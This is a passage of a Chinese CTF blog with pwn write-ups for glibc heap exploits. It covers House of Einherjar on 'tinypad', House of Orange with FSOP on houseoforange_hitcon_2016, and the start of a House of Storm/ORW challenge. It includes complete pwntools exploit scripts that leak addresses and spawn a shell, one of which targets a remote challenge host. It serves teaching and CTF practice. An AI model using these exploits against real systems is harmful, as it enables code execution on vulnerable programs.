    sla('(INDEX)&gt;&gt;&gt; ',str(idx))

def exit():
    sla('(CMD)&gt;&gt;&gt; ','Q')
</code></pre>
<p>先申请四个chunk，free(3)和free(1),堆块大于0x7f，所以会进入unsorted bin里，chunk是从1开始计数的，此时chunk_1里存放的就是chunk_3的头指针和main_arena+88的地址，chunk_3的头指针前面有两个大小为(0x100+0x10)的chunk，减去(0x100+0x10)*2就是heap的基地址，之后计算出main_arena+88与libc基地址的距离（这个距离是固定的）0x7f19d3ef7b78−0x7f19d3b33000=0x3C4B78</p>
<pre><code>add(0x100)
add(0x100)
add(0x100)
add(0x100)

free(3)
free(1)
ru('INDEX: 1')
ru('CONTENT: ')
heapbase = u64(ru('\n')[:-1].ljust(8,b'\x00')) -(0x100+0x10)*2
ru('INDEX: 3')
ru('CONTENT: ')
libcbase = u64(ru('\n')[:-1].ljust(8,b'\x00')) - 0x3C4B78
environ = libc.sym['environ']+libcbase
lg('heapbase',heapbase)
lg('libcbase',libcbase)

dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/2c42cb785bac44009458a23a58d7351a.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/2c42cb785bac44009458a23a58d7351a.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/e4a80c077a944e0aaf438d8d41d87caf.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"></p>
<p>在 tinypad 的前0x100字节中伪造 chunk。当我们再次申请时，那么就可以控制4个 memo 的指针和内容了。</p>
<pre><code>add(0x100)
add(0x100)

#dbg()

#四个chunk与top chunk合并
free(4)
free(1)
free(2)
free(3)

#dbg()
#empty now 

add(0x100,'a'*0x100)
edit(1,b'a'*0x30+p64(0)+p64(0x41)+p64(0x602070)*2+b'\x00'*0x20+p64(0x40))

#dbg()


free(1)


add(0x10) #1
add(0xf0) #2
add(0x10) #3
add(0x100,'a'*0x100) #4
</code></pre>
<p>之后free(1)，再申请0x18大小的chunk_1，利用add函数里自定义的read函数的off-by-null，可以将chunk_2的pre_size改为chunk数组附近0x602070处，再次free(2)，这样利用House of einherjar，可以将free的 chunk转移到0x602070（chunk_2的头指针）处，就可以0x602040（chunk_1的头指针）处形成我们提前构造好的chunk</p>
<pre><code>#edit(1,b'a'*0x30+p64(0)+p64(0x41)+p64(0x602070)*2+b'\x00'*0x20+p64(0x40))


free(1)
target = heapbase+0x20-0x602070
add(0x18,b'a'*0x10+p64(target)) #1

dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/e81bf64023f74d5c8fbec47c042304c2.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/e81bf64023f74d5c8fbec47c042304c2.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"><br>再free（2），编辑chunk_4就相当于在0x602040处的chunk开始编辑，将</p>
<pre><code>free(2)

edit(4,b'a'*0x30+p64(0)+p64(0x101)+p64(main_arena_88)*2)

dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/716576b4406d4a1ca57028748e1549e4.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/716576b4406d4a1ca57028748e1549e4.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/e9b6cca861874a2e970bba4d84c1e939.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/e9b6cca861874a2e970bba4d84c1e939.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"></p>
<p>再申请0xf0大小的chunk（实际大小为0x100），此时申请的chunk就在0x602070处，而该chunk的mem区域与chunk全局数组起始地址0x602140相差（0x602140-0x602070+0x10）=0xc0，用字符a填充，之后按照chunk size+头指针依次填充全局数组，将chunk_1改为environ地址，chunk2改为0x602148地址（也就是存放environ地址的地址）</p>
<pre><code>add(0xf0,b'a'*0xc0+p64(0x100)+p64(environ)+p64(0x100)+p64(0x602148))
ru('INDEX: 1')
ru('CONTENT: ')
stack= u64(ru('\n')[:-1].ljust(8,b'\x00'))
target =  -0xF0 + stack 
lg('stack',stack)
lg('target',target)
#0x7fc7dd85ff38 &lt;environ&gt;:	0x00007ffc91b85d58	0x0000000000000000
#1e:00f0│       0x7ffc91b85c68 —▸ 0x7fc7dd4b9830 (__libc_start_main+240) ◂— mov    edi, eax
#  0x7ffc91b85c68-0x00007ffc91b85d58=-0xF0
dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/eb9b6db414da4794933e15619b64eaff.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/eb9b6db414da4794933e15619b64eaff.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"></p>
<p>泄露出来的chunk_1的内容就是栈地址 stack=0x00007ffc91b85d58，在查看栈区main函数返回地址0x7ffc91b85c68，0x7ffc91b85c68-0x00007ffc91b85d58=-0xF0，所以我们要覆盖的main函数返回地址为target = -0xF0 + stack<br class='item-img' data-src='https://img-blog.csdnimg.cn/4687391ea27f4699bfb42ba822df650c.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/4687391ea27f4699bfb42ba822df650c.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/a18627ab0eb547b78e2ed5bba19b75cf.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/a18627ab0eb547b78e2ed5bba19b75cf.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"><br>刚才我们把chunk_2的mem指向了chunk_1的mem指针，编辑chunk_2为target地址，把chunk_1的mem指针改为target地址，这时再次编辑chunk_1为one_gadget地址，就把target地址存放的main函数返回地址改为了exeve(“/bin/sh\x00”)，再退出程序，获得shell</p>
<pre><code>edit(2,p64(target))
one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]
shell = one_gadget[0] + libcbase
edit(1,p64(shell))
exit()
itr()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/7446788a5c9e455c8c7e3820ac52216c.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/7446788a5c9e455c8c7e3820ac52216c.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"></p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code># coding=utf-8
from pwn import*
context(endian='little',os='linux',arch='amd64',log_level='debug') #小端序，linux系统，64位架构,debug
sh = process('./tinypad')
libc = ELF('/home/pwn/tools/glibc-all-in-one/libs/2.23-0ubuntu11_amd64/libc-2.23.so')

#命令简写化
s       = lambda data               :sh.send(data)
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
r       = lambda num=4096           :sh.recv(num)
ru      = lambda delims             :sh.recvuntil(delims)
itr     = lambda                    :sh.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))
#定义gdb调试函数
def dbg():
        gdb.attach(sh)
        pause()

def add(size, content='a'):
    sla('(CMD)&gt;&gt;&gt; ','a')
    sla('(SIZE)&gt;&gt;&gt; ',str(size))
    sla('(CONTENT)&gt;&gt;&gt; ',content)



def edit(idx, content):
    sla('(CMD)&gt;&gt;&gt; ','e')
    sla('(INDEX)&gt;&gt;&gt; ',str(idx))
    sla('(CONTENT)&gt;&gt;&gt; ',content)
    sla('Is it OK?\n','Y')
   


def free(idx):
    sla('(CMD)&gt;&gt;&gt; ','d')
    sla('(INDEX)&gt;&gt;&gt; ',str(idx))

def exit():
    sla('(CMD)&gt;&gt;&gt; ','Q')
     
add(0x100)
add(0x100)
add(0x100)
add(0x100)

free(3)
free(1)
ru('INDEX: 1')
ru('CONTENT: ')
heapbase = u64(ru('\n')[:-1].ljust(8,b'\x00')) -(0x100+0x10)*2
ru('INDEX: 3')
ru('CONTENT: ')
main_arena_88 = u64(ru('\n')[:-1].ljust(8,b'\x00')) 
libcbase = main_arena_88-0x3C4B78
environ = libc.sym['environ']+libcbase
lg('heapbase',heapbase)
lg('libcbase',libcbase)

#dbg()

add(0x100)
add(0x100)

#dbg()

#四个chunk与top chunk合并
free(4)
free(1)
free(2)
free(3)

#dbg()
#empty now 

add(0x100,'a'*0x100)
edit(1,b'a'*0x30+p64(0)+p64(0x41)+p64(0x602070)*2+b'\x00'*0x20+p64(0x40))

#dbg()

free(1)

add(0x10) #1
add(0xf0) #2
add(0x10) #3
add(0x100,'a'*0x100) #4

#dbg()

free(1)

#dbg()

target = heapbase+0x20-0x602070
add(0x18,b'a'*0x10+p64(target)) #1


free(2)

#dbg()

edit(4,b'a'*0x30+p64(0)+p64(0x101)+p64(main_arena_88)*2)

#dbg()

add(0xf0,b'a'*0xc0+p64(0x100)+p64(environ)+p64(0x100)+p64(0x602148))
ru('INDEX: 1')
ru('CONTENT: ')
stack= u64(ru('\n')[:-1].ljust(8,b'\x00'))
target =  -0xF0 + stack 
lg('stack',stack)
lg('target',target)
#0x7f825ab56f38 &lt;environ&gt;:	0x00007ffe282d8c28	0x0000000000000000
#00:0000│  0x7ffe282d8b38 —▸ 0x7f825a7b0830 (__libc_start_main+240) ◂— mov    edi, eax
#  0x7ffe282d8b38-0x00007ffe282d8c28=-0xF0
#dbg()

edit(2,p64(target))
one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]
shell = one_gadget[0] + libcbase
edit(1,p64(shell))
exit()
 
itr()
</code></pre>
]]></content>
      <tags>
        <tag>House of 系列</tag>
      </tags>
  </entry>
  <entry>
    <title>House Of Orange</title>
    <url>/2023/04/10/House%20of%20Orange/</url>
    <content><![CDATA[<h1 id="House-of-orange"><a href="#House-of-orange" class="headerlink" title="House of orange"></a>House of orange</h1><h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>题目中不存在 free 函数或其他释放堆块的函数。</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>House of Orange 核心就是通过漏洞利用获得 free 的效果。当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。</p>
<h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><pre><code>1.篡改top chunk size（注意size需要对齐内存页）
2.分配比top chunk size大的chunk。
3.现在原来的top chunk进入了unsorted bin中，再次malloc就会从unsored bin中切分出需要的大小，剩余部分作新的unsorted bin。
</code></pre>
<h3 id="注意：伪造top-chunk-size时，必须满足以下要求"><a href="#注意：伪造top-chunk-size时，必须满足以下要求" class="headerlink" title="注意：伪造top chunk size时，必须满足以下要求"></a>注意：伪造top chunk size时，必须满足以下要求</h3><pre><code>1.伪造的size必须要对齐到内存页。
2.size要大于MINSIZE。
3.size要小于之后申请的chunk size + MINISIZE。
4.size的prev inuse位必须为1。
5.malloc的大小不能大于mmap分配阈值。
</code></pre>
<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="houseoforange-hitcon-2016"><a href="#houseoforange-hitcon-2016" class="headerlink" title="houseoforange_hitcon_2016"></a>houseoforange_hitcon_2016</h2><p class='item-img' data-src='https://img-blog.csdnimg.cn/c9f278bf58b84b5588446c344a510595.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/c9f278bf58b84b5588446c344a510595.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"><br>保护全开，打开ida</p>
<h2 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h2><pre><code>void __fastcall __noreturn main(const char *a1, char **a2, char **a3)
{
  int choice; // eax

  sub_1218();
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      choice = my_read(a1, a2);
      if ( choice != 2 )
        break;
      show();
    }
    if ( choice &gt; 2 )
    {
      if ( choice == 3 )
      {
        edit();
      }
      else
      {
        if ( choice == 4 )
        {
          puts("give up");
          exit(0);
        }
LABEL_13:
        a1 = "Invalid choice";
        puts("Invalid choice");
      }
    }
    else
    {
      if ( choice != 1 )
        goto LABEL_13;
      add();
    }
  }
}
</code></pre>
<h2 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h2><p>会申请三个chunk，chunk_1存放chunk_2和chunk_3的mem指针，chunk_2存放name，chunk_3存放price和color。由于num2的限制，只能使用4次add函数。</p>
<pre><code>int add()
{
  unsigned int size; // [rsp+8h] [rbp-18h]
  int color; // [rsp+Ch] [rbp-14h]
  _QWORD *v3; // [rsp+10h] [rbp-10h]
  _DWORD *v4; // [rsp+18h] [rbp-8h]

  if ( num2 &gt; 3u )                              // num开始为0，可利用add4次
  {
    puts("Too many house");
    exit(1);
  }
  v3 = malloc(0x10uLL);   //chunk_1
  printf("Length of name :");
  size = my_read();
  if ( size &gt; 0x1000 )
    size = 0x1000;
  v3[1] = malloc(size);     //chunk_2
  if ( !v3[1] )
  {
    puts("Malloc error !!!");
    exit(1);
  }
  printf("Name :");
  my_read2((void *)v3[1], size);
  v4 = calloc(1uLL, 8uLL);      //chunk_3
  printf("Price of Orange:");
  *v4 = my_read();
  ::color();
  printf("Color of Orange:");
  color = my_read();
  if ( color != 0xDDAA &amp;&amp; (color &lt;= 0 || color &gt; 7) )
  {
    puts("No such color");
    exit(1);
  }
  if ( color == 0xDDAA )
    v4[1] = 0xDDAA;
  else
    v4[1] = color + 30;
  *v3 = v4;
  heap_array = v3;
  ++num2;
  return puts("Finish");
}
</code></pre>
<h2 id="show函数"><a href="#show函数" class="headerlink" title="show函数"></a>show函数</h2><pre><code>int sub_EE6()
{
  int v0; // eax
  int v2; // eax

  if ( !heap_array )
    return puts("No such house !");
  if ( *(_DWORD *)(*heap_array + 4LL) == 0xDDAA )
  {
    printf("Name of house : %s\n", (const char *)heap_array[1]);
    printf("Price of orange : %d\n", *(unsigned int *)*heap_array);
    v0 = rand();
    return printf("\x1B[01;38;5;214m%s\x1B[0m\n", *((const char **)&amp;unk_203080 + v0 % 8));
  }
  else
  {
    if ( *(int *)(*heap_array + 4LL) &lt;= 30 || *(int *)(*heap_array + 4LL) &gt; 37 )
    {
      puts("Color corruption!");
      exit(1);
    }
    printf("Name of house : %s\n", (const char *)heap_array[1]);
    printf("Price of orange : %d\n", *(unsigned int *)*heap_array);
    v2 = rand();
    return printf("\x1B[%dm%s\x1B[0m\n", *(unsigned int *)(*heap_array + 4LL), *((const char **)&amp;unk_203080 + v2 % 8));
  }
}
</code></pre>
<h2 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h2><p>存在漏洞，修改chunk时的size大小由我们自己修改，可造成堆溢出，修改下一个chunk的内容，edit函数有num作为限制，只能使用3次</p>
<pre><code>int sub_107C()
{
  _DWORD *v1; // rbx
  unsigned int size; // [rsp+8h] [rbp-18h]
  int v3; // [rsp+Ch] [rbp-14h]

  if ( num &gt; 2u )                               // num开始为0，可利用edit3次
    return puts("You can't upgrade more");
  if ( !heap_array )
    return puts("No such house !");
  printf("Length of name :");
  size = my_read();
  if ( size &gt; 0x1000 )
    size = 4096;
  printf("Name:");                              // size由我们输入，存在溢出
  my_read2((void *)heap_array[1], size);
  printf("Price of Orange: ");
  v1 = (_DWORD *)*heap_array;
  *v1 = my_read();
  color();
  printf("Color of Orange: ");
  v3 = my_read();
  if ( v3 != 0xDDAA &amp;&amp; (v3 &lt;= 0 || v3 &gt; 7) )
  {
    puts("No such color");
    exit(1);
  }
  if ( v3 == 0xDDAA )
    *(_DWORD *)(*heap_array + 4LL) = 0xDDAA;
  else
    *(_DWORD *)(*heap_array + 4LL) = v3 + 30;
  ++num;
  return puts("Finish");
}
</code></pre>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>程序不存在free函数，而按照我们的一般思路都是先free一个大于0x7f的chunk，进入unsortedbin，获得libc基地址，之后覆盖hook函数为system函数获得shell。而这道题不能这样做，add和edit函数的使用次数也有限制，这道题的edit函数存在堆溢出，可以考虑使用House of orange，通过修改top chunk为一个比较小的值，然后分配一个很大的chunk，使top chunk进入unsortedbin，从而泄露libc，这样heap基地址也能泄露出来，之后的话，可以使用FSOP，获得shell。</p>
<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>先把前面的写好</p>
<pre><code># coding=utf-8
from pwn import  *
 
context(endian='little',os='linux',arch='amd64',log_level='debug') #小端序，linux系统，64位架构,debug
 
binary = './houseoforange_hitcon_2016'  
#sh = process(binary) #连接本地程序
sh = remote('node4.buuoj.cn',26188) #连接远程程序
elf = ELF(binary)     
libc = ELF('../../libc-2.23.so--64')  

#libc-2.23.so--64
one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]
one_gadget[0] = 0x45216
s       = lambda data               :sh.send(data)
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
r       = lambda num=4096           :sh.recv(num)
ru      = lambda delims  :sh.recvuntil(delims )
itr     = lambda                    :sh.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
lg=lambda address,data:log.success('%s: '%(address)+hex(data))
#定义gdb调试函数
def dbg():
        gdb.attach(sh)
        pause()
def add(size, content, price='2', color='1'):
    ru("Your choice : ")
    sl('1')
    ru("Length of name :")
    sl(str(size))
    ru("Name :")
    sh.send(content)
    ru("Price of Orange:")
    sl(str(price))
    ru("Color of Orange:")    #1-7
    sl(str(color))


def show():
    ru("Your choice : ")
    sl('2')

def edit(size, content, price='2', color='1'):
    ru("Your choice : ")
    sl('3')
    ru("Length of name :")
    sl(str(size))
    ru("Name:")
    sh.send(content)
    ru("Price of Orange:")
    sl(str(price))
    ru("Color of Orange:")    #1-7
    sl(str(color))
</code></pre>
<h3 id="修改top-chunk"><a href="#修改top-chunk" class="headerlink" title="修改top chunk"></a>修改top chunk</h3><p>随便申请一个chunk，然后利用edit函数，溢出修改topchunk</p>
<pre><code>add(0x30,'aaaa\n')
dbg()
payload = 'a' * 0x30 +p64(0) + p64(0x21) + p32(2) + p32(2) + p64(0) * 2 + p64(0xf81)
edit(len(payload), payload)
dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/a23256312ac74a1c922b94fb13e84135.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/a23256312ac74a1c922b94fb13e84135.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"><br>top chunk大小为0x0000000000020f81<br>修改后的top chunk 大小为0x0000000000000f81<br class='item-img' data-src='https://img-blog.csdnimg.cn/259e73d11d5f45ad823f0a9bf7ff1f12.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/259e73d11d5f45ad823f0a9bf7ff1f12.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"></p>
<h3 id="申请大于top-chunk的chunk，进入unsortedbin"><a href="#申请大于top-chunk的chunk，进入unsortedbin" class="headerlink" title="申请大于top chunk的chunk，进入unsortedbin"></a>申请大于top chunk的chunk，进入unsortedbin</h3><pre><code>add(0x1000, 'a\n')
dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/d36f2307ea63433d8af823bfb7a100a0.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/d36f2307ea63433d8af823bfb7a100a0.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"></p>
<h3 id="泄露libc和heap"><a href="#泄露libc和heap" class="headerlink" title="泄露libc和heap"></a>泄露libc和heap</h3><p>调试可得此时我们刚刚申请的0x400chunk里存放着0x00007fe0c1216188距离libc基地址0x3c5188（0x00007fe0c1216188-0x7fe0c0e51000），该chunk里还存放着heap地址，因为printf遇到’\x00’会停止打印，所以我们将0x00007fe0c1216188改为字符串b，再将其输出</p>
<pre><code>add(0x400, 'a' * 8)
show()
ru('a'*8)
libc.address = u64(ru('\x7f').ljust(8, '\x00')) - 0x3c5188
lg('libc.address',libc.address)
io_list_all = libc.symbols['_IO_list_all']
system = libc.symbols['system']
dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/b0e56ad2215f45969686d4431486c9cd.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/b0e56ad2215f45969686d4431486c9cd.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"></p>
<p>我们泄露出的heap为0x5617117b30e0，距离heap基地址0x5617117b30e0-0x5617117b3000=0xe0，由此可获得heap_base地址</p>
<pre><code>payload = 'b' * 0x10
edit(0x10, payload)
show()
ru('b'*0x10)
heap = u64(sh.recvuntil('\n').strip().ljust(8, '\x00'))
heap_base = heap - 0xE0
lg('heap_base',heap_base)
dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/2f717d520ea740d1acf13b1f48f78f98.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/2f717d520ea740d1acf13b1f48f78f98.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"></p>
<h3 id="构造fake-file"><a href="#构造fake-file" class="headerlink" title="构造fake_file"></a>构造fake_file</h3><p>接下来我们修改当前unsortedbin中chunk的大小和内容,这里FSOP还不太明白，先借用一下大佬写的解释</p>
<p>malloc时，对unsorted bin进行判断，此时该chunk的size为0x60，不满足要求，就把该chunk放入small bin，并且向bk-&gt;fd写入main_arena+0x58，即向_IO_list_all写入main_arena+0x58，此时判断下一个unsorted bin（_IO_list_all），而这里实际上没有chunk，此时会触发错误，此时第一个_IO_FILE_plus结构体为main_arena+0x58，而它不满足条件，就通过_chain调到下一个_IO_FILE_plus结构体，_chain位于0x68偏移的地方，main_arena+0x58+0x68=main_arena+0xc0，就是small bin中0x60大小的地方，这就回到了我们伪造的_IO_FILE_plus结构体</p>
<pre><code>dbg()
payload = 'a' * 0x400 + p64(0) + p64(0x21) + p32(2) + p32(1) + p64(0)
fake_file = '/bin/sh\x00'+p64(0x61)#to small bin
fake_file += p64(0)+p64(io_list_all-0x10)
fake_file += p64(0) + p64(1)#_IO_write_base &lt; _IO_write_ptr
fake_file = fake_file.ljust(0xc0,'\x00')
fake_file += p64(0) * 3
fake_file += p64(heap_base+0x5E8) #vtable ptr
fake_file += p64(0) * 2
fake_file += p64(system)
payload += fake_file
edit(len(payload), payload)
dbg()
</code></pre>
<p>修改前<br class='item-img' data-src='https://img-blog.csdnimg.cn/e49a2d19a419461eb89c5c1b58bf3f99.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/e49a2d19a419461eb89c5c1b58bf3f99.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"><br>修改后<br class='item-img' data-src='https://img-blog.csdnimg.cn/c6487fe320ee4b1880bcd2c64cca274f.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/c6487fe320ee4b1880bcd2c64cca274f.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"></p>
<p>之后我们再调用add函数，调用malloc函数，就可以产生错误信息，改变程序执行流程，获得shell</p>
<pre><code>ru("Your choice : ")
sl('1')
itr()
</code></pre>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code># coding=utf-8
from pwn import  *
 
context(endian='little',os='linux',arch='amd64',log_level='debug') #小端序，linux系统，64位架构,debug
 
binary = './houseoforange_hitcon_2016'  
#sh = process(binary) #连接本地程序
sh = remote('node4.buuoj.cn',26188) #连接远程程序
elf = ELF(binary)     
libc = ELF('../../libc-2.23.so--64')  

#libc-2.23.so--64
one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]
one_gadget[0] = 0x45216
s       = lambda data               :sh.send(data)
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
r       = lambda num=4096           :sh.recv(num)
ru      = lambda delims  :sh.recvuntil(delims )
itr     = lambda                    :sh.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
lg=lambda address,data:log.success('%s: '%(address)+hex(data))
#定义gdb调试函数
def dbg():
        gdb.attach(sh)
        pause()
def add(size, content, price='2', color='1'):
    ru("Your choice : ")
    sl('1')
    ru("Length of name :")
    sl(str(size))
    ru("Name :")
    sh.send(content)
    ru("Price of Orange:")
    sl(str(price))
    ru("Color of Orange:")    #1-7
    sl(str(color))


def show():
    ru("Your choice : ")
    sl('2')

def edit(size, content, price='2', color='1'):
    ru("Your choice : ")
    sl('3')
    ru("Length of name :")
    sl(str(size))
    ru("Name:")
    sh.send(content)
    ru("Price of Orange:")
    sl(str(price))
    ru("Color of Orange:")    #1-7
    sl(str(color))



add(0x30,'aaaa\n')
#dbg()
payload = 'a' * 0x30 +p64(0) + p64(0x21) + p32(2) + p32(1) + p64(0) * 2 + p64(0xf81)
 
edit(len(payload), payload)
#dbg()
add(0x1000, 'a\n')
#dbg()
add(0x400, 'a' * 8)
#dbg()
show()
ru('a'*8)
libc.address = u64(ru('\x7f').ljust(8, '\x00')) - 0x3c5188
lg('libc.address',libc.address)
  
io_list_all = libc.symbols['_IO_list_all']
system = libc.symbols['system']

payload = 'b' * 0x10
 

edit(0x10, payload)

show()
ru('b'*0x10)
heap = u64(sh.recvuntil('\n').strip().ljust(8, '\x00'))
heap_base = heap - 0xE0
lg('heap_base',heap_base)
#dbg()
 
payload = 'a' * 0x400 + p64(0) + p64(0x21) + p32(2) + p32(1) + p64(0)
fake_file = '/bin/sh\x00'+p64(0x61)#to small bin
fake_file += p64(0)+p64(io_list_all-0x10)
fake_file += p64(0) + p64(1)#_IO_write_base &lt; _IO_write_ptr
fake_file = fake_file.ljust(0xc0,'\x00')
fake_file += p64(0) * 3
fake_file += p64(heap_base+0x5E8) #vtable ptr
fake_file += p64(0) * 2
fake_file += p64(system)
payload += fake_file
edit(len(payload), payload)
#dbg()
 
ru("Your choice : ")
sl('1')

itr()
</code></pre>
<p>可能因为本地环境没配好，打不通，在buu上远程可以打通<br class='item-img' data-src='https://img-blog.csdnimg.cn/a54c5f2bc33e4c2f8519058f1e79b38d.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/a54c5f2bc33e4c2f8519058f1e79b38d.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"></p>
<blockquote>
<p>参考文章<br><a href="https://www.cnblogs.com/LynneHuan/p/14696780.html">houseoforange_hitcon_2016</a><br><a href="https://blog.csdn.net/weixin_44145820/article/details/105270036">houseoforange_hitcon_2016</a></p>
</blockquote>
]]></content>
      <tags>
        <tag>House of 系列</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2023/09/11/House%20of%20Storm+%E5%A0%86SROP+orw/</url>
    <content><![CDATA[<p><strong>同样是house of storm，但是如果程序开启了沙箱，禁用了system函数，那我们常规把hook函数改为system函数的方法就失效了，<br>若是沙箱没有禁用open，read，write函数，这里我们可以考虑用orw。</strong></p>
<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="rctf-2019-babyheap"><a href="#rctf-2019-babyheap" class="headerlink" title="rctf_2019_babyheap"></a>rctf_2019_babyheap</h2><p class='item-img' data-src='https://img-blog.csdnimg.cn/6a20e21660eb442fb4871b211f9bbe59.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/6a20e21660eb442fb4871b211f9bbe59.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"></p>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/d5ddcfdaa4074a059283f919bb74e430.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/d5ddcfdaa4074a059283f919bb74e430.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"><br>保护全开，禁用了execve就是禁用了system，因为system函数通过调用execve函数才能执行。<br>看一下ida</p>
<h3 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h3><p>可以看到是实现了四个功能，增改删查</p>
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  init(argc, argv, envp);
  while ( 1 )
  {
    menu();
    switch ( get_int() )
    {
      case 1:
        add();
        break;
      case 2:
        edit();
        break;
      case 3:
        delete();
        break;
      case 4:
        show();
        break;
      case 5:
        puts("See you next time!");
        exit(0);
      default:
        puts("Invalid choice!");
        break;
    }
  }
}
</code></pre>
<h3 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h3><p>可以申请最大0x1000大小的chunk，最多申请16个chunk</p>
<pre><code>unsigned __int64 add()
{
  void **v0; // rbx
  int i; // [rsp+0h] [rbp-20h]
  int size; // [rsp+4h] [rbp-1Ch]
  unsigned __int64 v4; // [rsp+8h] [rbp-18h]

  v4 = __readfsqword(0x28u);
  for ( i = 0; *(ptrs + 2 * i) &amp;&amp; i &lt;= 15; ++i )
    ;
  if ( i == 16 )
  {
    puts("You can't");
    exit(-1);
  }
  printf("Size: ");
  size = get_int();
  if ( size &lt;= 0 || size &gt; 0x1000 )
  {
    puts("Invalid size :(");
  }
  else
  {
    *(ptrs + 4 * i + 2) = size;
    v0 = (ptrs + 16 * i);
    *v0 = calloc(size, 1uLL);
    puts("Add success :)");
  }
